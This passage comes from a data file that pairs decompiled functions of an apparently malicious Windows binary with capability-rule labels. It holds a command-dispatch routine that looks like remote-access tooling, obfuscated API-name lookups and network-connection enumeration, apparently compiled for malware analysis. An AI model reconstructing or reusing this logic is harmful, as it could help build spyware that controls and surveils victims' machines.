0x204;\n        *(&stack0xfffffff8 + iVar4) = 2;\n        *(&stack0xfffffff4 + iVar4) = 7;\n        *(&stack0xfffffff0 + iVar4) = puVar15;\n        *(&stack0xfffffffc + iVar4) = iVar13 + 0x204;\n        *(&stack0xffffffec + iVar4) = 0x40201b;\n        fcn.004129fb();\n        *(&stack0x00000000 + iVar4) = 0x1000;\n        *(&stack0xfffffffc + iVar4) = puVar1;\n        *(&stack0xfffffff8 + iVar4) = 3;\n        *(&stack0xfffffff4 + iVar4) = 7;\n        *(&stack0xfffffff0 + iVar4) = puVar15;\n        *(&stack0xffffffec + iVar4) = 0x40203f;\n        fcn.004129fb();\n        *(&stack0xfffffff8 + iVar4) = 0x204;\n        *(&stack0xfffffff0 + iVar4) = puVar1;\n        *(&stack0xfffffff4 + iVar4) = iVar13 + 0x408;\n        *(&stack0xffffffec + iVar4) = 0x402059;\n        fcn.00412d73();\n        *(&stack0x00000000 + iVar4) = 0x1000;\n        *(&stack0xfffffffc + iVar4) = puVar1;\n        *(&stack0xfffffff8 + iVar4) = 4;\n        *(&stack0xfffffff4 + iVar4) = 7;\n        *(&stack0xfffffff0 + iVar4) = puVar15;\n        *(&stack0xffffffec + iVar4) = 0x40207d;\n        fcn.004129fb();\n        *(&stack0xfffffff0 + iVar4) = puVar1;\n        *(&stack0xffffffec + iVar4) = 0x402085;\n        uVar8 = fcn.00412666();\n        *(iVar13 + 0x610) = uVar8;\n        *(&stack0x00000000 + iVar4) = 0x1000;\n        *(&stack0xfffffffc + iVar4) = puVar1;\n        *(&stack0xfffffff8 + iVar4) = 5;\n        *(&stack0xfffffff4 + iVar4) = 7;\n        *(&stack0xfffffff0 + iVar4) = puVar15;\n        *(&stack0xffffffec + iVar4) = 0x4020af;\n        fcn.004129fb();\n        *(&stack0xfffffff0 + iVar4) = puVar1;\n        *(&stack0xffffffec + iVar4) = 0x4020b7;\n        iVar7 = fcn.00412666();\n        uVar8 = *(&stack0x000014e0 + iVar4);\n        *(iVar13 + 0x60c) = iVar7 != 0;\n        *(iVar13 + 0x618) = uVar8;\n        *(&stack0xfffffff4 + iVar4) = iVar13;\ncode_r0x0040162b:\n        *(&stack0xfffffff0 + iVar4) = fcn.004093e7;\n        goto code_r0x00401632;\n    case 0x2e:\n        *(&stack0xfffffff0 + iVar4) = puVar15;\n        *(&stack0xffffffec + iVar4) = 0x4018d5;\n        uVar8 = fcn.00412666();\n        *(&stack0xfffffff0 + iVar4) = uVar8;\n        *(&stack0xffffffec + iVar4) = 0x4018dd;\n        fcn.004121c0();\n        break;\n    case 0x2f:\n        *(&stack0xfffffff0 + iVar4) = puVar15;\n        *(&stack0xffffffec + iVar4) = 0x4018ea;\n        uVar8 = fcn.00412666();\n        *(&stack0xfffffff0 + iVar4) = uVar8;\n        *(&stack0xffffffec + iVar4) = 0x4018f2;\n        fcn.00412191();\n        break;\n    case 0x30:\n        *(&stack0xfffffff8 + iVar4) = 6;\n        *(&stack0xfffffff4 + iVar4) = puVar15;\n        *(&stack0xfffffff0 + iVar4) = &stack0x000004c0 + iVar4;\n        *(&stack0xffffffec + iVar4) = 0x401912;\n        fcn.00412aa3();\n        *(&stack0xfffffff0 + iVar4) = *(&stack0x000004c0 + iVar4);\n        *(&stack0xfffffff4 + iVar4) = *(&stack0x000004c4 + iVar4);\n        *(&stack0xffffffec + iVar4) = 0x40192d;\n        fcn.004122a3();\n        break;\n    case 0x31:\n        *(&stack0xfffffff8 + iVar4) = 6;\n        *(&stack0xfffffff4 + iVar4) = puVar15;\n        *(&stack0xfffffff0 + iVar4) = &stack0x000004c0 + iVar4;\n        *(&stack0xffffffec + iVar4) = 0x40194d;\n        fcn.00412aa3();\n        *(&stack0xfffffff0 + iVar4) = *(&stack0x000004c0 + iVar4);\n        *(&stack0xfffffff4 + iVar4) = *(&stack0x000004c4 + iVar4);\n        *(&stack0xffffffec + iVar4) = 0x401968;\n        fcn.004121ef();\n        break;\n    case 0x32:\n        *(&stack0xfffffff4 + iVar4) = *puVar15;\n        *(&stack0xfffffff0 + iVar4) = *(&stack0x000014e0 + iVar4);\n        *(&stack0xffffffec + iVar4) = 0x4018c8;\n        fcn.004120c4();\n        break;\n    case 0x35:\n        *(&stack0xfffffff0 + iVar4) = 0x40;\n        *(&stack0xffffffec + iVar4) = 0x401979;\n        cVar3 = fcn.004082e8();\n        uVar8 = *(&stack0x000014e0 + iVar4);\n        if (cVar3 != '\\0') {\n            *(&stack0xfffffffc + iVar4) = 0x422400;\n            *(&stack0xfffffff8 + iVar4) = 0x422a09;\n            *(&stack0xfffffff4 + iVar4) = 0x204;\n            *(&stack0x000006c8 + iVar4) = uVar8;\n            *(&stack0xfffffff0 + iVar4) = &stack0x000004c0 + iVar4;\n            (&stack0x000006c4)[iVar4] = 0xcc;\n            (&stack0x000006c5)[iVar4] = 0xcd;\n            (&stack0x000006cc)[iVar4] = 0;\n            *(&stack0xffffffec + iVar4) = 0x4019e7;\n            fcn.004127a8();\n            goto code_r0x004019e7;\n        }\n        *(&stack0xfffffffc + iVar4) = 0xffffffff;\n        *(&stack0xfffffff8 + iVar4) = 0;\n        *(&stack0xfffffff4 + iVar4) = 0xcd;\n        goto code_r0x00401234;\n    case 0x37:\n        *(&stack0xfffffff0 + iVar4) = puVar15;\n        *(&stack0xffffffec + iVar4) = 0x401a21;\n        uVar8 = fcn.0040a1d5();\n        *(&stack0xfffffffc + iVar4) = puVar15;\n        *(&stack0x00000000 + iVar4) = uVar8;\n        *(&stack0xfffffff8 + iVar4) = \"%s\\a%d\";\n        *(&stack0xfffffff4 + iVar4) = 0x1000;\n        *(&stack0xfffffff0 + iVar4) = &stack0x000004c0 + iVar4;\n        *(&stack0xffffffec + iVar4) = 0x401a48;\n        uVar8 = fcn.004127a8();\n        *(&stack0xfffffff8 + iVar4) = &stack0x000004c0 + iVar4;\n        *(&stack0xfffffffc + iVar4) = uVar8;\n        *(&stack0xfffffff4 + iVar4) = 0xce;\ncode_r0x0040122d:\n        uVar8 = *(&stack0x000014e0 + iVar4);\ncode_r0x00401234:\n        *(&stack0xfffffff0 + iVar4) = uVar8;\n        *(&stack0xffffffec + iVar4) = 0x40123c;\n        fcn.00405d7d();\n        break;\n    case 0x38:\n        *(&stack0xfffffff0 + iVar4) = puVar15;\n        *(&stack0xffffffec + iVar4) = 0x401a14;\n        fcn.0040a115();\n        break;\n    case 0x39:\n        *(&stack0xfffffff4 + iVar4) = puVar15;\n        *(&stack0xfffffff0 + iVar4) = *(&stack0x000014e0 + iVar4);\n        *(&stack0xffffffec + iVar4) = 0x401a07;\n        fcn.00409ffd();\n        break;\n    case 0x3c:\n    case 0x3d:\n        *(&stack0xfffffff0 + iVar4) = puVar15;\n        *(&stack0xffffffec + iVar4) = 0x4020de;\n        uVar12 = fcn.00412666();\n        *(&stack0xfffffff8 + iVar4) = uVar12 & 0xff;\n        *(&stack0xfffffff4 + iVar4) = uVar11 & 0xff;\n        *(&stack0xfffffff0 + iVar4) = *(&stack0x000014e0 + iVar4);\n        *(&stack0xffffffec + iVar4) = 0x4020fd;\n        fcn.0040f873();\n        break;\n    case 0x3e:\n    case 0x3f:\n        *(&stack0xfffffff0 + iVar4) = puVar15;\n        *(&stack0xffffffec + iVar4) = 0x40210a;\n        uVar12 = fcn.00412666();\n        *(&stack0xfffffff8 + iVar4) = uVar12 & 0xff;\n        *(&stack0xfffffff4 + iVar4) = uVar11 & 0xff;\n        *(&stack0xfffffff0 + iVar4) = *(&stack0x000014e0 + iVar4);\n        *(&stack0xffffffec + iVar4) = 0x402129;\n        fcn.0040fd78();\n        break;\n    case 0x40:\n    case 0x41:\n        *(&stack0xfffffff0 + iVar4) = puVar15;\n        *(&stack0xffffffec + iVar4) = 0x402136;\n        uVar12 = fcn.00412666();\n        *(&stack0xfffffff8 + iVar4) = uVar12 & 0xff;\n        *(&stack0xfffffff4 + iVar4) = uVar11 & 0xff;\n        *(&stack0xfffffff0 + iVar4) = *(&stack0x000014e0 + iVar4);\n        *(&stack0xffffffec + iVar4) = 0x402155;\n        fcn.0040fdcd();\n        break;\n    case 0x42:\n        *(&stack0xfffffff0 + iVar4) = 0xc;\n        *(&stack0xffffffec + iVar4) = 0x402166;\n        iVar13 = sub.msvcrt.dll_malloc();\n        if (iVar13 == 0) {\n            return;\n        }\n        *(&stack0xfffffff4 + iVar4) = puVar15;\n        *(&stack0xfffffff8 + iVar4) = 4;\n        *(&stack0xfffffff0 + iVar4) = iVar13 + 4;\n        *(&stack0xffffffec + iVar4) = 0x40218a;\n        fcn.00412aa3();\n        *(&stack0xfffffff8 + iVar4) = 4;\n        *(&stack0xfffffff4 + iVar4) = puVar15 + 4;\n        *(&stack0xfffffff0 + iVar4) = iVar13 + 8;\n        *(&stack0xffffffec + iVar4) = 0x4021a1;\n        fcn.00412aa3();\n        *(&stack0xfffffff4 + iVar4) = iVar13;\n        *(&stack0xfffffff0 + iVar4) = 0x411ceb;\n        goto code_r0x00401632;\n    case 0x48:\n        *(&stack0xfffffff0 + iVar4) = 0x210;\n        *(&stack0xffffffec + iVar4) = 0x401d29;\n        iVar13 = sub.msvcrt.dll_malloc();\n        if (iVar13 != 0) {\n            *(&stack0x00000000 + iVar4) = 0x204;\n            *(&stack0xfffffffc + iVar4) = iVar13;\n            *(&stack0xfffffff8 + iVar4) = 1;\n            *(&stack0xfffffff4 + iVar4) = 7;\n            *(&stack0xfffffff0 + iVar4) = puVar15;\n            *(&stack0xffffffec + iVar4) = 0x401d57;\n            fcn.004129fb();\n            *(&stack0x00000000 + iVar4) = 0x1000;\n            *(&stack0xfffffff8 + iVar4) = 2;\n            *(&stack0xfffffff4 + iVar4) = 7;\n            *(&stack0xfffffff0 + iVar4) = puVar15;\n            *(&stack0xfffffffc + iVar4) = &stack0x000004c0 + iVar4;\n            *(&stack0xffffffec + iVar4) = 0x401d82;\n            fcn.004129fb();\n            cVar3 = (&stack0x000004c0)[iVar4];\n            uVar8 = *(&stack0x000014e0 + iVar4);\n            *(iVar13 + 0x204) = 0;\n            *(iVar13 + 0x20d) = 1;\n            *(iVar13 + 0x208) = uVar8;\n            *(iVar13 + 0x20c) = cVar3 != '\\0';\n            *(&stack0xfffffff4 + iVar4) = iVar13;\n            *(&stack0xfffffff0 + iVar4) = fcn.0040753d;\n            *(&stack0xffffffec + iVar4) = 0x401dbf;\n            *0x42b32c = fcn.00407f08();\n        }\n        break;\n    case 0x4b:\n        *0x42b32c = 0;\n        break;\n    case 0x4c:\n        *(&stack0xfffffff0 + iVar4) = 0x414;\n        *(&stack0xffffffec + iVar4) = 0x401de4;\n        pcVar5 = sub.msvcrt.dll_malloc();\n        if (pcVar5 == NULL) {\n            return;\n        }\n        *(&stack0xfffffff0 + iVar4) = puVar15;\n        *(&stack0x00000000 + iVar4) = 0x204;\n        *(&stack0xfffffffc + iVar4) = pcVar5;\n        *(&stack0xfffffff8 + iVar4) = 1;\n        *(&stack0xfffffff4 + iVar4) = 7;\n        *(&stack0xffffffec + iVar4) = 0x401e17;\n        fcn.004129fb();\n        *(&stack0xfffffff0 + iVar4) = puVar15;\n        *(&stack0x00000000 + iVar4) = 0x1000;\n        *(&stack0xfffffff8 + iVar4) = 2;\n        *(&stack0xfffffff4 + iVar4) = 7;\n        *(&stack0xfffffffc + iVar4) = &stack0x000004c0 + iVar4;\n        *(&stack0xffffffec + iVar4) = 0x401e49;\n        fcn.004129fb();\n        *(pcVar5 + 0x40c) = 0;\n        *(&stack0xfffffff4 + iVar4) = pcVar5;\n        *(&stack0xfffffff0 + iVar4) = pcVar5 + 0x204;\n        *(&stack0xffffffec + iVar4) = 0x401e65;\n        sub.msvcrt.dll_strcpy();\n        *(&stack0xfffffff4 + iVar4) = pcVar5;\n        *(&stack0xfffffff0 + iVar4) = &stack0x000002bc + iVar4;\n        *(&stack0xffffffec + iVar4) = 0x401e71;\n        sub.msvcrt.dll_strcpy();\n        uVar11 = 0xffffffff;\n        pcVar16 = pcVar5;\n        do {\n            if (uVar11 == 0) break;\n            uVar11 = uVar11 - 1;\n            cVar3 = *pcVar16;\n            pcVar16 = pcVar16 + 1;\n        } while (cVar3 != '\\0');\n        (&stack0x000002ba)[~uVar11 + iVar4] = 0;\n        *(&stack0xfffffff4 + iVar4) = \".zip\";\n        *(&stack0xfffffff0 + iVar4) = &stack0x000002bc + iVar4;\n        *(&stack0xffffffec + iVar4) = 0x401e93;\n        uVar8 = sub.msvcrt.dll_strcat();\n        *(&stack0xfffffff8 + iVar4) = 0x77;\n        *(&stack0xfffffff4 + iVar4) = 6;\n        *(&stack0xfffffff0 + iVar4) = uVar8;\n        *(&stack0xffffffec + iVar4) = 0x401eab;\n        uVar8 = fcn.0041e44c();\n        uVar11 = 0xffffffff;\n        *(pcVar5 + 0x408) = uVar8;\n        pcVar16 = pcVar5;\n        do {\n            if (uVar11 == 0) break;\n            uVar11 = uVar11 - 1;\n            cVar3 = *pcVar16;\n            pcVar16 = pcVar16 + 1;\n        } while (cVar3 != '\\0');\n        *(pcVar5 + 0x410) = ~uVar11 - 1;\n        *(&stack0xfffffff4 + iVar4) = pcVar5;\n        *(&stack0xfffffff0 + iVar4) = fcn.00406f83;\ncode_r0x00401632:\n        *(&stack0xffffffec + iVar4) = 0x401637;\n        fcn.00407f08();\n        break;\n    case 0x4d:\n        *(&stack0xfffffff0 + iVar4) = *(&stack0x000014e0 + iVar4);\n        *(&stack0xffffffec + iVar4) = 0x4021c0;\n        fcn.0040262f();\n        break;\n    case 0x4f:\n        *(&stack0xfffffff4 + iVar4) = puVar15;\n        *(&stack0xfffffff8 + iVar4) = 4;\n        *(&stack0xfffffff0 + iVar4) = &stack0x000004c0 + iVar4;\n        *(&stack0xffffffec + iVar4) = 0x4021e3;\n        fcn.00412aa3();\n        *(&stack0xfffffff8 + iVar4) = puVar15 + 4;\n        *(&stack0xfffffff4 + iVar4) = *(&stack0x000004c0 + iVar4);\n        *(&stack0xfffffff0 + iVar4) = *(&stack0x000014e0 + iVar4);\n        *(&stack0xffffffec + iVar4) = 0x402201;\n        fcn.00410ec3();\n        break;\n    case 0x51:\n        *(&stack0xfffffff4 + iVar4) = puVar15;\n        *(&stack0xfffffff8 + iVar4) = 4;\n        puVar15 = puVar15 + 4;\n        pcVar5 = &stack0x000004c0 + iVar4;\n        *(&stack0xfffffff0 + iVar4) = &stack0x0000007c + iVar4;\n        *(&stack0xffffffec + iVar4) = 0x402232;\n        fcn.00412aa3();\n        *(&stack0xfffffff0 + iVar4) = puVar15;\n        *(&stack0x00000000 + iVar4) = 0x204;\n        *(&stack0xfffffff8 + iVar4) = 1;\n        *(&stack0xfffffff4 + iVar4) = 7;\n        *(&stack0xfffffffc + iVar4) = &stack0x000002bc + iVar4;\n        *(&stack0xffffffec + iVar4) = 0x40225d;\n        fcn.004129fb();\n        uVar11 = 0xffffffff;\n        pcVar16 = &stack0x000002bc + iVar4;\n        do {\n            if (uVar11 == 0) break;\n            uVar11 = uVar11 - 1;\n            cVar3 = *pcVar16;\n            pcVar16 = pcVar16 + 1;\n        } while (cVar3 != '\\0');\n        *(&stack0xfffffff0 + iVar4) = puVar15;\n        *(&stack0x00000000 + iVar4) = 0x104;\n        *(&stack0xfffffff8 + iVar4) = 2;\n        *(&stack0xfffffff4 + iVar4) = 7;\n        *(&stack0x00000020 + iVar4) = ~uVar11 - 1;\n        *(&stack0xfffffffc + iVar4) = &stack0x000000bc + iVar4;\n        *(&stack0xffffffec + iVar4) = 0x40229f;\n        fcn.004129fb();\n        uVar11 = 0xffffffff;\n        pcVar16 = &stack0x000000bc + iVar4;\n        do {\n            if (uVar11 == 0) break;\n            uVar11 = uVar11 - 1;\n            cVar3 = *pcVar16;\n            pcVar16 = pcVar16 + 1;\n        } while (cVar3 != '\\0');\n        *(&stack0xfffffff0 + iVar4) = puVar15;\n        *(&stack0x00000000 + iVar4) = 0x1000;\n        *(&stack0xfffffffc + iVar4) = pcVar5;\n        *(&stack0xfffffff8 + iVar4) = 3;\n        *(&stack0xfffffff4 + iVar4) = 7;\n        *(&stack0xffffffec + iVar4) = 0x4022d1;\n        fcn.004129fb();\n        *(&stack0xfffffff0 + iVar4) = pcVar5;\n        *(&stack0xffffffec + iVar4) = 0x4022d9;\n        uVar8 = fcn.00412666();\n        uVar12 = 0xffffffff;\n        *(&stack0x00000024 + iVar4) = uVar8;\n        pcVar16 = pcVar5;\n        do {\n            if (uVar12 == 0) break;\n            uVar12 = uVar12 - 1;\n            cVar3 = *pcVar16;\n            pcVar16 = pcVar16 + 1;\n        } while (cVar3 != '\\0');\n        *(&stack0xfffffff0 + iVar4) = puVar15;\n        *(&stack0x00000000 + iVar4) = 0x1000;\n        *(&stack0xfffffffc + iVar4) = pcVar5;\n        *(&stack0xfffffff8 + iVar4) = 4;\n        *(&stack0xfffffff4 + iVar4) = 7;\n        *(&stack0x00000020 + iVar4) = (~uVar11 - 1) + *(&stack0x00000020 + iVar4);\n        *(&stack0x00000028 + iVar4) = ~uVar12 - 1;\n        *(&stack0xffffffec + iVar4) = 0x40231b;\n        fcn.004129fb();\n        *(&stack0xfffffff0 + iVar4) = pcVar5;\n        *(&stack0xffffffec + iVar4) = 0x402323;\n        uVar8 = fcn.00412666();\n        uVar11 = 0xffffffff;\n        pcVar16 = pcVar5;\n        do {\n            if (uVar11 == 0) break;\n            uVar11 = uVar11 - 1;\n            cVar3 = *pcVar16;\n            pcVar16 = pcVar16 + 1;\n        } while (cVar3 != '\\0');\n        *(&stack0xfffffff0 + iVar4) = puVar15;\n        *(&stack0x00000000 + iVar4) = 0x1000;\n        *(&stack0xfffffffc + iVar4) = pcVar5;\n        *(&stack0xfffffff8 + iVar4) = 5;\n        *(&stack0xfffffff4 + iVar4) = 7;\n        *(&stack0x0000002c + iVar4) = ~uVar11 - 1;\n        *(&stack0x00000020 + iVar4) = *(&stack0x00000020 + iVar4) + 5 + *(&stack0x00000028 + iVar4);\n        *(&stack0xffffffec + iVar4) = 0x40236b;\n        fcn.004129fb();\n        *(&stack0xfffffff0 + iVar4) = pcVar5;\n        *(&stack0xffffffec + iVar4) = 0x402373;\n        uVar9 = fcn.00412666();\n        iVar13 = -1;\n        do {\n            if (iVar13 == 0) break;\n            iVar13 = iVar13 + -1;\n            cVar3 = *pcVar5;\n            pcVar5 = pcVar5 + 1;\n        } while (cVar3 != '\\0');\n        *(&stack0x0000000c + iVar4) = uVar8;\n        *(&stack0x00000008 + iVar4) = uVar9;\n        *(&stack0x00000004 + iVar4) =\n             puVar15 + *(&stack0x0000002c + iVar4) + *(&stack0x00000020 + iVar4) + (-2 - iVar13);\n        *(&stack0x00000000 + iVar4) = *(&stack0x00000024 + iVar4);\n        *(&stack0xfffffffc + iVar4) = &stack0x000000bc + iVar4;\n        *(&stack0xfffffff8 + iVar4) = &stack0x000002bc + iVar4;\n        *(&stack0xfffffff4 + iVar4) = *(&stack0x0000007c + iVar4);\n        *(&stack0xfffffff0 + iVar4) = *(&stack0x000014e0 + iVar4);\n        *(&stack0xffffffec + iVar4) = 0x4023ce;\n        fcn.00410fc4();\n        break;\n    case 0x52:\n        *(&stack0xfffffff0 + iVar4) = *(&stack0x000014e0 + iVar4);\n        *(&stack0xffffffec + iVar4) = 0x4023df;\n        fcn.00406084();\n    }\n    return;\ncode_r0x004013e2:\n    *(&stack0xfffffff0 + iVar4) = &stack0x000014e0 + iVar4;\n    *(&stack0xffffffec + iVar4) = 0x4013f1;\n    fcn.00405999();\n    *(&stack0xffffffec + iVar4) = 0x4013f6;\n    fcn.00401000();\n    *(&stack0xffffffec + iVar4) = 0x4013fb;\n    fcn.00408af3();\n    *(&stack0xffffffec + iVar4) = 0x401400;\n    sub.WS2_32.dll_WSACleanup();\n    *(&stack0xfffffff0 + iVar4) = 0;\n    // WARNING: Subroutine does not return\n    *(&stack0xffffffec + iVar4) = 0x40140c;\n    sub.KERNEL32.dll_ExitProcess();\n}\n",
        "token_count": 16123
    },
    "0040262f": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid fcn.0040262f(uint param_1)\n\n{\n    uint32_t uVar1;\n    uint16_t uVar2;\n    uint32_t uVar3;\n    uint uVar4;\n    code *pcVar5;\n    int32_t iVar6;\n    uint32_t uVar7;\n    uint *puVar8;\n    uint uVar9;\n    uchar *puVar10;\n    uint32_t uStack976;\n    code *pcStack972;\n    uint32_t uStack964;\n    int32_t iStack960;\n    uint32_t *puStack956;\n    uint32_t *puStack952;\n    uint uStack948;\n    uint uStack944;\n    uchar auStack940 [4];\n    int32_t iStack936;\n    uchar auStack868 [64];\n    uint auStack804 [197];\n    \n    fcn.0041236c(&uStack944, 0x8000);\n    uStack976 = fcn.00407f7a(\"iphlpapi.dll\");\n    uVar3 = fcn.00407f7a(0x422b8f);\n    uStack964 = fcn.00407f7a(0x422b99);\n    uVar4 = fcn.004081aa(\"Ed5jf5dRSdSqYsqCVid\");\n    pcVar5 = fcn.00407f8e(uStack976, uVar4);\n    uVar4 = fcn.004081aa(\"Ed5jf5dRSdSuSsqCVid\");\n    pcStack972 = fcn.00407f8e(uStack976, uVar4);\n    uVar4 = fcn.004081aa(\"Ed590WYd66XlCnd_4idLCldD\");\n    iVar6 = fcn.00407f8e(uVar3, uVar4);\n    if (iVar6 == 0) {\n        uVar4 = fcn.004081aa(\"Ed590WYd66XlCnd_4idLCldD\");\n        iVar6 = fcn.00407f8e(uStack964, uVar4);\n    }\n    if ((pcStack972 != NULL && pcVar5 != NULL) && (iVar6 != 0)) {\n        puVar8 = &uStack948;\n        uStack948 = 0;\n        iVar6 = (*pcVar5)(0, puVar8, 1, 2, 5, 0);\n        if (iVar6 == 0x7a) {\n            puStack956 = sub.msvcrt.dll_malloc(uStack948);\n            if (puStack956 == NULL) goto code_r0x00402a74;\n            uVar4 = 2;\n            puVar10 = 0x1;\n            iVar6 = (*pcVar5)(puStack956, puVar8, 1, 2, 5, 0);\n            if (iVar6 == 0) {\n                uVar7 = 0;\n                while( true ) {\n                    if (*puStack956 <= uVar7) break;\n                    uVar1 = puStack956[uVar7 * 6 + 2];\n                    uVar2 = sub.WS2_32.dll_ntohs(*(puStack956 + uVar7 * 6 + 3));\n                    uStack964 = uStack964 & 0xffff | uVar2 << 0x10;\n                    uVar4 = sub.WS2_32.dll_inet_ntoa(uVar1);\n                    fcn.004127a8(auStack940, 0x40, \"%s:%u\", uVar4, uVar3 >> 0x10);\n                    iVar6 = uStack964 + uVar7 * 0x18;\n                    uVar4 = *(iVar6 + 0x10);\n                    uVar2 = sub.WS2_32.dll_ntohs(*(iVar6 + 0x14));\n                    pcStack972 = pcStack972 & 0xffff | uVar2 << 0x10;\n                    sub.WS2_32.dll_inet_ntoa(uVar4);\n                    fcn.004127a8();\n                    fcn.00402570();\n                    uVar4 = fcn.004081aa();\n                    puVar8 = &uStack948;\n                    puVar10 = auStack868;\n                    iVar6 = fcn.004127a8();\n                    if (0 < iVar6) {\n                        fcn.00412458();\n                    }\n                    uVar7 = uVar7 + 1;\n                }\n            }\n            if (puStack956 != NULL) {\n                fcn.00407f59(&puStack956, puVar8, puVar10, uVar4);\n            }\n        }\n        puVar8 = &uStack948;\n        uStack948 = 0;\n        iVar6 = (*pcStack972)(0, puVar8, 1, 2, 1, 0);\n        if (iVar6 == 0x7a) {\n            puStack952 = sub.msvcrt.dll_malloc(uStack948);\n            if (puStack952 != NULL) {\n                puVar10 = 0x2;\n                uVar4 = 1;\n                iVar6 = (*pcStack972)(puStack952, puVar8, 1, 2, 1, 0);\n                if (iVar6 == 0) {\n                    uVar7 = 0;\n                    while( true ) {\n                        if (*puStack952 <= uVar7) break;\n                        uVar1 = puStack952[uVar7 * 3 + 1];\n                        uVar2 = sub.WS2_32.dll_ntohs(*(puStack952 + uVar7 * 3 + 2));\n                        uStack976 = uStack976 & 0xffff0000 | uVar2;\n                        sub.WS2_32.dll_inet_ntoa(uVar1);\n                        fcn.004127a8();\n                        fcn.00402570();\n                        puVar10 = auStack940;\n                        uVar4 = *(uVar7 * 0xc + iStack960 + 0xc);\n                        puVar8 = auStack804;\n                        iVar6 = fcn.004127a8();\n                        if (0 < iVar6) {\n                            fcn.00412458();\n                        }\n                        uVar7 = uVar7 + 1;\n                    }\n                }\n                if (puStack952 != NULL) {\n                    fcn.00407f59(&puStack952, puVar8, uVar4, puVar10);\n                }\n            }\n        }\n    }\ncode_r0x00402a74:\n    if (iStack936 == 0) {\n        uVar4 = 0;\n        uStack944 = 0;\n        uVar9 = 0xe5;\n    }\n    else {\n        uVar4 = fcn.00412540(&uStack944);\n        uVar9 = 0xe4;\n    }\n    fcn.00405d7d(param_1, uVar9, uStack944, uVar4);\n    fcn.004123b1(&uStack944);\n    fcn.00407fab(uStack976);\n    fcn.00407fab(uVar3);\n    fcn.00407fab(uStack964);\n    return;\n}\n",
        "token_count": 1566
    },
    "0040478e": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid fcn.0040478e(uint param_1, uint param_2, int16_t *param_3, uint *param_4, uint *param_5)\n\n{\n    uint8_t *puVar1;\n    uint uVar2;\n    uint uVar3;\n    int32_t iVar4;\n    int16_t iVar5;\n    int32_t iVar6;\n    uint uVar7;\n    uint32_t uVar8;\n    uint8_t uVar9;\n    uint8_t uVar10;\n    uint8_t uVar11;\n    uint8_t uStack24;\n    \n    uVar2 = param_5[0xf0];\n    uVar3 = *param_5;\n    fcn.0040454f(param_1, param_2, 0x4280a0);\n    iVar6 = 0;\n    do {\n        puVar1 = iVar6 + 0x422e60;\n        iVar4 = iVar6 * 2;\n        iVar6 = iVar6 + 1;\n        *(*puVar1 * 2 + 0x428020) = *(iVar4 + 0x4280a0);\n    } while (iVar6 != 0x40);\n    iVar5 = *0x428020 - *param_3;\n    *param_3 = *0x428020;\n    if (iVar5 == 0) {\n        uVar7 = *param_4;\n    }\n    else {\n        fcn.004042c8(param_4[*(*0x42a808 + iVar5)]);\n        uVar7 = *(*0x42a800 + iVar5 * 4);\n    }\n    uVar11 = 0x3f;\n    fcn.004042c8(uVar7);\n    iVar6 = 0x428020;\n    while (*(iVar6 + 0x7e) == 0) {\n        iVar6 = iVar6 + -2;\n        uVar11 = uVar11 - 1;\n        if (uVar11 == 0) goto code_r0x004048e3;\n    }\n    uStack24 = 1;\n    uVar10 = uStack24;\n    do {\n        for (; (iVar5 = *(uStack24 * 2 + 0x428020),  iVar5 == 0 && (uStack24 <= uVar11)); uStack24 = uStack24 + 1) {\n        }\n        uVar10 = uStack24 - uVar10;\n        uVar8 = uVar10;\n        if (0xf < uVar10) {\n            uVar9 = 1;\n            do {\n                fcn.004042c8(uVar2);\n                uVar9 = uVar9 + 1;\n            } while (uVar9 <= uVar10 >> 4);\n            uVar8 = uVar8 & 0xf;\n        }\n        fcn.004042c8(param_5[uVar8 * 0x10 + *(*0x42a808 + iVar5)]);\n        fcn.004042c8(*(*0x42a800 + iVar5 * 4));\n        uStack24 = uStack24 + 1;\n        uVar10 = uStack24;\n    } while (uStack24 <= uVar11);\n    if (uVar11 != 0x3f) {\ncode_r0x004048e3:\n        fcn.004042c8(uVar3);\n    }\n    return;\n}\n",
        "token_count": 744
    },
    "004049cf": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t fcn.004049cf(char *param_1, uint *param_2, uint32_t param_3, uint32_t param_4, uint32_t param_5, char param_6)\n\n{\n    uchar *puVar1;\n    uchar uVar2;\n    char cVar3;\n    uint32_t uVar4;\n    char *pcVar5;\n    int32_t iVar6;\n    char *pcVar7;\n    int32_t iVar8;\n    uint16_t uVar9;\n    int32_t iVar10;\n    int32_t iVar11;\n    uint32_t uVar12;\n    uint16_t uVar13;\n    int32_t iVar14;\n    int32_t iStack72;\n    int32_t iStack68;\n    ushort uStack34;\n    ushort uStack32;\n    ushort auStack30 [7];\n    \n    if (*0x428000 != param_5) {\n        *0x428000 = param_5;\n        fcn.00404190();\n        fcn.004041f5();\n        fcn.004043b2();\n        fcn.00404429();\n        fcn.004044bb();\n    }\n    *0x428004 = 0;\n    if (*0x42a80c == 0) {\n        *0x42a80c = sub.msvcrt.dll_malloc(0xffff);\n        if (*0x42a80c == 0) {\n            return 0;\n        }\n        *0x42a808 = *0x42a80c + 0x7fff;\n    }\n    if (*0x42a804 == 0) {\n        *0x42a804 = sub.msvcrt.dll_malloc(0x3fffc);\n        if (*0x42a804 == 0) {\n            return 0;\n        }\n        *0x42a800 = *0x42a804 + 0x1fffc;\n    }\n    iVar8 = *0x42a808;\n    iVar14 = *0x42a800;\n    iVar6 = 2;\n    iVar10 = 1;\n    cVar3 = '\\x01';\n    iVar11 = iVar10;\n    do {\n        for (; iVar10 < iVar6; iVar10 = iVar10 + 1) {\n            *(iVar8 + iVar10) = cVar3;\n            *(iVar14 + iVar10 * 4) = cVar3;\n            *(iVar14 + 2 + iVar10 * 4) = iVar10;\n        }\n        iVar10 = -iVar6;\n        while (iVar10 = iVar10 + 1,  iVar10 <= -iVar11) {\n            *(iVar8 + iVar10) = cVar3;\n            *(iVar14 + iVar10 * 